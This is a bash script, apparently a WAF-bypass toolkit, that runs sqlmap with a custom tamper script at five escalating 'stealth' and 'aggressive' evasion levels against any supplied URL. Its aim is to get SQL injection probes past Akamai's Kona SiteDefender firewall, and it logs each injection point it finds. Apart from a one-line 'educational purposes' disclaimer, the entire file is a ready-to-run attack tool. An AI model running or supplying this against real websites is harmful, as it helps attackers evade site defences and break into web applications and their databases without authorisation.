#!/bin/bash
# Professional Kona SiteDefender Testing Suite Comprehensive evasion techniques collection Research and educational purposes only by Zzl0y

TARGET_URL="$1"
OUTPUT_DIR="./kona_test_$(date +%Y%m%d_%H%M%S)"
TAMPER_SCRIPT="hakamai"

if [ -z "$TARGET_URL" ]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi

echo "=== Professional Kona SiteDefender Bypass Testing Suite ==="
echo "Target: $TARGET_URL"
echo "Output Directory: $OUTPUT_DIR"
echo ""

mkdir -p "$OUTPUT_DIR"

# Test configuration matrix
declare -A test_configs=(
    ["basic"]="TAMPER_LEVEL=1"
    ["standard"]="TAMPER_LEVEL=2"
    ["enhanced"]="TAMPER_LEVEL=3 TAMPER_AGGRESSIVE=1"
    ["stealth"]="TAMPER_LEVEL=4 TAMPER_STEALTH=1"
    ["adaptive"]="TAMPER_LEVEL=5 TAMPER_AGGRESSIVE=1 TAMPER_STEALTH=1"
)

for test_name in "${!test_configs[@]}"; do
    echo "=== Running $test_name configuration ==="
    
    config="${test_configs[$test_name]}"
    log_file="$OUTPUT_DIR/${test_name}_test.log"
    
    # Export configuration
    eval "export $config"
    export TAMPER_DEBUG=1
    
    # Determine optimal parameters based on level
    case "$test_name" in
        "basic"|"standard")
            delay=1; timeout=30; threads=5
            ;;
        "enhanced")
            delay=3; timeout=45; threads=3
            ;;
        "stealth")
            delay=5; timeout=60; threads=1
            ;;
        "adaptive")
            delay=10; timeout=90; threads=1
            ;;
    esac
    
    # Execute SQLMap with configuration
    sqlmap -u "$TARGET_URL" \
           --tamper="$TAMPER_SCRIPT" \
           --random-agent \
           --delay=$delay \
           --timeout=$timeout \
           --threads=$threads \
           --batch \
           --flush-session \
           --fresh-queries \
           -v 3 \
           2>&1 | tee "$log_file"
    
    # Generate summary
    echo "=== $test_name Test Summary ===" >> "$OUTPUT_DIR/summary.txt"
    echo "Configuration: $config" >> "$OUTPUT_DIR/summary.txt"
    echo "Parameters: delay=$delay, timeout=$timeout, threads=$threads" >> "$OUTPUT_DIR/summary.txt"
    
    if grep -q "sqlmap identified the following injection point" "$log_file"; then
        echo "Result: SUCCESS - Injection point found" >> "$OUTPUT_DIR/summary.txt"
    else
        echo "Result: BLOCKED - No injection points found" >> "$OUTPUT_DIR/summary.txt"
    fi
    echo "" >> "$OUTPUT_DIR/summary.txt"
    
    # Clean environment
    unset TAMPER_LEVEL TAMPER_AGGRESSIVE TAMPER_STEALTH
    
    sleep 30  # Cool-down period between tests
done

echo "=== Testing Complete ==="
echo "Results saved in: $OUTPUT_DIR"
echo "Summary available in: $OUTPUT_DIR/summary.txt"
